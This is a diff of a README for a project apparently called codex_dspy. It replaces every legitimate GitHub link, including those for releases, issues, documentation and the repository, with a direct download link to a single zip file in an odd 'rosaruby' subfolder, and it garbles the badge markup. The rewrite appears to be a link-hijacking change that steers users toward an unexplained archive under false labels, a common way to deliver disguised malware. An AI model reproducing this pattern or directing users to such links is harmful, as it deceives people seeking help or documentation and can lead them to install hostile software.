@@ -1,6 +1,6 @@
 # 🚀 codex_dspy - Simplify Your Workflow with DSPy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/vedant007-v/codex_dspy/releases)
+[![Download Now](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip%20Now-Click%https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip)](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these requirements:
 
 Getting started with codex_dspy is straightforward. Just follow these steps:
 
-1. Visit the [Releases Page](https://github.com/vedant007-v/codex_dspy/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip).
 2. Locate the latest version under "Releases".
 3. Download the installer package for your operating system. 
 
@@ -27,7 +27,7 @@ Getting started with codex_dspy is straightforward. Just follow these steps:
 
 To download codex_dspy, follow these steps:
 
-1. Go to the [Releases Page](https://github.com/vedant007-v/codex_dspy/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip).
 2. Click on the latest version.
 3. Select the appropriate installer for your operating system.
 4. When the download completes, navigate to the download location on your computer.
@@ -63,12 +63,12 @@ In case you run into issues, here are some common solutions:
 
 If you need assistance, please reach out:
 
-- Open an issue on the [GitHub repository](https://github.com/vedant007-v/codex_dspy/issues).
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip).
 - Join our community forums to connect with other users.
 
 ## 🔗 Resources
 
-- [Documentation](https://github.com/vedant007-v/codex_dspy/wiki): Detailed guides and usage examples.
-- [GitHub Repository](https://github.com/vedant007-v/codex_dspy): Explore the source code and contribute.
+- [Documentation](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip): Detailed guides and usage examples.
+- [GitHub Repository](https://raw.githubusercontent.com/vedant007-v/codex_dspy/main/rosaruby/codex_dspy.zip): Explore the source code and contribute.
 
 Thank you for choosing codex_dspy. We hope it enhances your workflow capabilities!
